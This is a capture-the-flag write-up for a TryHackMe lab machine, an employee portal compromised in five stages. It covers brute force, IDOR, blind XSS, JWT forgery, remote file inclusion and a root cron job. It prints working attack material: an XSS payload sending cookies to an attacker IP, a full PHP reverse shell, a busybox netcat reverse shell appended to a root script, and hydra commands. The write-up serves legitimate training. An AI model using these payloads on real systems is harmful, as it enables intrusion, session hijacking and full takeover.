
A CTF challenge from Junior Penetration Tester path on TryHackMe.

Description:
*The NexusCorp Employee Portal appears to be a typical internal application with authentication controls and role-based access in place. However, multiple small weaknesses, ranging from misconfigurations to logic flaws, can be combined to fully compromise the system.*
*As an attacker, your objective is to observe how the application behaves, interact with its endpoints, and identify weak trust boundaries. By analysing requests, modifying parameters, and chaining vulnerabilities together, you can progressively escalate your access and move deeper into the system.*
*_A single misstep can trigger a chain reaction, exploit each weakness in sequence and watch the system fall, one domino at a time.*

There are 5 flags to grab in this challenge.
Let's begin!

Nmap scan - `nmap -A -p- -v -T4 10.80.142.199`:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 5e:51:47:9a:ee:ff:75:37:8c:a2:36:5c:bf:16:3f:8f (ECDSA)
|_  256 23:fd:7b:9a:99:f0:49:df:4e:db:9a:e7:44:e7:3a:38 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: NexusCorp Portal
|_http-server-header: Apache/2.4.58 (Ubuntu)
```

I went straight to webapp, and started with fuzzing: `gobuster dir -u 'http://10.80.142.199/' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-words.txt -x .php,.php.bak,.bak,.txt,.jsp,.json,.asp,.js,.py -b 403-500`.

The results:
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 314] [--> http://10.80.142.199/admin/]
/index.php            (Status: 200) [Size: 861]
/logout.php           (Status: 302) [Size: 0] [--> /index.php]
/config.php           (Status: 200) [Size: 0]
/backup               (Status: 301) [Size: 315] [--> http://10.80.142.199/backup/]
/api                  (Status: 301) [Size: 312] [--> http://10.80.142.199/api/]
/support              (Status: 301) [Size: 316] [--> http://10.80.142.199/support/]
/javascript           (Status: 301) [Size: 319] [--> http://10.80.142.199/javascript/]
/static               (Status: 301) [Size: 315] [--> http://10.80.142.199/static/]
/auth.php             (Status: 200) [Size: 0]
/.                    (Status: 200) [Size: 861]
/403.php              (Status: 200) [Size: 322]
/dashboard.php        (Status: 302) [Size: 0] [--> /index.php]
/team.php             (Status: 200) [Size: 3747]
/forgot.php           (Status: 200) [Size: 684]
/reset.php            (Status: 200) [Size: 410]
Progress: 1196000 / 1196010 (100.00%)
===============================================================
Finished
===============================================================
```

The webapp itself welcomed me with a login page. I went through all `.php` files which returned `200` in case there are some comments left by devs.
In `/team.php` I found potential usernames of employees:
```
laura.hayes
michael.chen
sarah.johnson
robert.wilson
emma.taylor
david.brown
james.wright
```

In the `/backup` directory I found a `README.txt` and `config.enc` files.
In the first one I found a clue:
```
NexusCorp Backup Configuration
================================
config.enc  - Encrypted application configuration (AES-128-ECB)
Decryption key reference: see static/app.js (deployment notes)
```

Immediately I checked `/static/app.js` in search for notes. There I found a decryption key:
```
// Configuration (TODO: move to env before prod deployment - laura 2024-10-22)
    const CONFIG = {
        apiBase: '/api',
        // Encryption key for backup config decryption - AES-ECB-128
        // Key: N3xusK3y2024!!  (pad to 16 bytes with �)
        _backupKey: 'N3xusK3y2024!!',
        appVersion: '2.3.1'
```

I downloaded `config.enc`, and decrypted it with command: `openssl enc -d -aes-128-ecb -in config.enc -out decrypted_file -K 4e337875734b33793230323421210000`, the password I found in `/static/app.js` needs to be provided in hex form.
The contents of `decrypted_file`:
```
{"app_name":"NexusCorp Portal","version":"2.3.1","deploy_env":"production","system_user":"devops"}
```

Nothing interesting so far, So I went back to the login form, and tried to bruteforce it with employees usernames, that I found earlier.
I created a file named `users.txt`, and used `hydra` to bruteforce login form.

`hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.112.176.213 http-post-form "/index.php/:username=^USER^&password=^PASS^:F=Invalid credentials" -V`

I was hoping for some quick hits, but after a little time, I found out three sets of credentials:
```
login: sarah.johnson   password: password
login: robert.wilson   password: password
login: emma.taylor   password: password
```

Every one of those employees has role set to user, so it doesn't matter who you will log in as.
There is `My Profile API` functionality, which allows to see users id, username, email, role, and notes. The path is interesting: `/api/users/profile.php?id=4`, straight away I changed the `id` parameter to `1`, and there was JSON body with `laura.hayes` data, who is an admin on this platform. And in her notes there was a first flag.

**What is the flag found in the admin user's profile notes?**
**THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}**

Next interesting thing I found on the website is *Support Ticket* functionality. The cookies on the website has `HttpOnly` flag set to `false`, so javascript can access them.
I used payload `<img src=x onerror=fetch('http://10.112.86.109/?c='+document.cookie>`, and I put it both in the *subject* and *message* while creating a ticket.
I also set up simple python server with command `python3 -m http.server 80`, and I created a ticket.
There was a hit on my web server, but without a cookie.
I used custom python server script that logs request headers in order to exfiltrate a cookie:
```
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def _log(self):
        print(f"\n--- {self.command} {self.path} ---")
        print("Headers:")
        for key, value in self.headers.items():
            print(f"  {key}: {value}")

        length = int(self.headers.get("Content-Length", 0))
        if length:
            body = self.rfile.read(length)
            print(f"Body ({length} bytes):")
            print(body.decode("utf-8", errors="replace"))

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK\n")

    do_GET = do_POST = do_PUT = do_DELETE = do_PATCH = do_HEAD = _log

if __name__ == "__main__":
    port = 80
    print(f"Listening on http://localhost:{port}")
    HTTPServer(("0.0.0.0", port), Handler).serve_forever()
```

I ran it with `python3 web-server.py`, and I sent a new ticket with URL that points to my machine:
`http://MY_IP`.
And when I got the hit, I also saw request headers, where the admins cookie was:
```
--- GET / ---
Headers:
  Host: 192.168.160.186
  User-Agent: python-requests/2.31.0
  Accept-Encoding: gzip, deflate
  Accept: */*
  Connection: keep-alive
  Cookie: nexus_session=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImxhdXJhLmhheWVzIiwgInJvbGUiOiAiYWRtaW4ifQ==.2d1632df0b5a19cc9a8db3b2e72e612b0110c4e4aaed1265006b8c0bc73f6834
10.112.169.61 - - [05/Oct/2026 11:06:05] "GET / HTTP/1.1" 200 -
```

Then, I went back to my browser, to the challenge website, and change my cookie, to admin one.
After refreshing a page, I got admin dashboard available, and inside was the second flag.

**What is the flag displayed on the admin panel after gaining admin access?**
**THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}**

The next step is to obtain RCE on the web server.
I focused on `/api/files.php?name=` endpoint which allows to access files on the server remotely.
In order to do that, I needed JWT token from `/api/auth/token.php`.
The issue is, even as an `laura.hayes`, which has role set to admin in `nexus_session` token, after getting JWT, the role in it's payload is set to user.
So, I need to forge a JWT, token.
Earlier in `app.js` I found a key: `N3xusK3y2024!!`, so I tried it as a secret to forge valid JWT.
I used JWT Editor Burp's extension, and created new symmetric key, with secret found in app.js. Then I changed role to admin and signed it.
The JWT was valid and I was able to read files from the server.
While testing `/api/files.php?name=` endpoint, I found out that it is vulnerable to RFI. So, I created a `php` reverse shell file on my machine:
```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.160.186';
$port = 1337;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

I set up python3 web server, and nc listener. Then I sent `GET` request to `/api/files.php?name=http://192.168.160.186/revshell.php`, and I got connection from the server, as a `www-data`.
I upgraded shell with command: `python3 -c 'import pty;pty.spawn("/bin/bash")'`.
I grabbed 3rd flag.

**What is the flag obtained after achieving remote code execution on the server? Flag is stored in `/opt/flag3.txt`**
**THM{rf1_2_rc3_f00th0ld_fl4g3}**

When going through files on a machine, I found `config.php` in `/var/www/html` directory.
Inside I found database credentials:
```
define('DB_HOST', 'localhost');
define('DB_NAME', 'nexusdb');
define('DB_USER', 'app_user');
define('DB_PASS', 'D3v0ps!2024');
define('JWT_SECRET', 'nexus_jwt_s3cr3t_2024');
define('APP_SECRET', 'nexus_app_k3y_2024');
```

The database password was reused for `devops` user on the machine, so I switched from `www-data` to `devops` with `su devops` command, and provided password: `D3v0ps!2024`.

**What is the flag found in the **devops** user's home directory?**
**THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}**

To escalate privileges to `root`, I used `pspy` to check processes ran on the server.
I grabbed `pspy64` via my python web server, then I made it executable with `chmod +x` and ran it `./pspy64`.
I found out that there is a process ran by `root` - `CMD: UID=0     PID=1816   | /bin/bash /opt/monitoring/health_report.sh`. 
I checked the `health_report.sh` script, and with `ls -lah /opt/monitoring` and I as a `devops` have write privileges `-rwxrwxr-- 1 root devops  537 May 18 10:41 health_report.sh`.
I placed a busybox reverse shell command inside of it:
`echo "busybox nc 192.168.160.186 1338 -e sh" >> health_report.sh`, and I waited for connection.

I got the shell as `root`, and read `root.txt` with final flag.

**THM{pr1v3sc_cr0n_r00t_fl4g5}**
